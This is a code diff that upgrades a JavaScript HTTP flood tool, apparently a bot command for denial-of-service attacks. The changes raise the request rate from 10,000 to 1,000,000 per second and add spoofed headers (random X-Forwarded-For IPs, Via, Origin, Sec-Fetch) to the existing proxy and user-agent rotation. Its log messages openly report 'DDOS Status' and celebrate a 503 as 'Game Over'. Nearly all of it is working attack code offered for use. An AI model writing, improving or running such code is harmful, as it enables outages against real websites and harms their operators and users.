@@ -48,7 +48,8 @@ const referrers = [
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
     "http://go.mail.ru/search?mail.ru=1&q=",
-    "http://help.baidu.com/searchResult?keywords="
+    "http://help.baidu.com/searchResult?keywords=",
+    "https://net25.com/news"
 ];
 
 const cipherSuites = [
@@ -63,13 +64,14 @@ const acceptHeaders = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
 ];
 
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 10000;
+const requestsPerSecond = 1000000;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
@@ -97,6 +99,7 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
     if (!continueAttack) return;
 
     const headersForRequest = {
+        "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": sanitizeUA(getRandomElement(userAgents())),
         "Accept": getRandomElement(acceptHeaders),
         "Accept-Language": getRandomElement(langHeaders),
@@ -105,21 +108,42 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         "Connection": "keep-alive",
         "DNT": "1",
         "Upgrade-Insecure-Requests": "1",
-        "TE": "Trailers"
+        "TE": "Trailers",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Pragma": getRandomElement(cipherSuites),
+        "X-Forwarded-For": getRandomIP(),
+        "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
+        "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+        "Host": url.replace(/https?:\/\//, "").split("/")[0],
+        "sec-fetch-site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Origin": url.split("/").slice(0, 3).join("/"),
     };
 
-    axios.get(url, {
+
+    axios
+    .get(url, {
         httpAgent: agent,
         headers: headersForRequest,
-        timeout: 0
+        timeout: 0,
     })
-    .then(() => {
+    .then((response) => {
+        if (response.status === 200) {
+            console.log(rainbow(`PING SUCCESS! ${response.status}`));
+        }
         requestsSent++;
         checkCompletion(requestsSent);
         setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
     })
     .catch((err) => {
-        if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || err.code === 'EHOSTUNREACH' || err.code === 'ETIMEDOUT' || err.code === "EAI_AGAIN" || err.message === 'Socket is closed') {
+        if (
+            err.code === "ECONNRESET" ||
+            err.code === "ECONNREFUSED" ||
+            err.code === "EHOSTUNREACH" ||
+            err.code === "ETIMEDOUT" ||
+            err.code === "EAI_AGAIN" ||
+            err.message === "Socket is closed"
+        ) {
             console.log(rainbow("Unable to Attack Target Server Refused!"));
             continueAttack = false;
         } else if (err.response?.status === 404) {
@@ -129,6 +153,8 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
             console.log(rainbow("Target under heavy load (503) - Game Over!"));
         } else if (err.response?.status === 502) {
             console.log(rainbow("Bad Gateway (502)."));
+        } else if (err.response?.status === 403) {
+            console.log(rainbow("Forbidden (403)."));
         } else if (err.response?.status) {
             console.log(rainbow(`DDOS Status: (${err.response?.status})`));
         } else {
@@ -139,6 +165,7 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
     });
 };
+
 
 
 module.exports.run = async ({
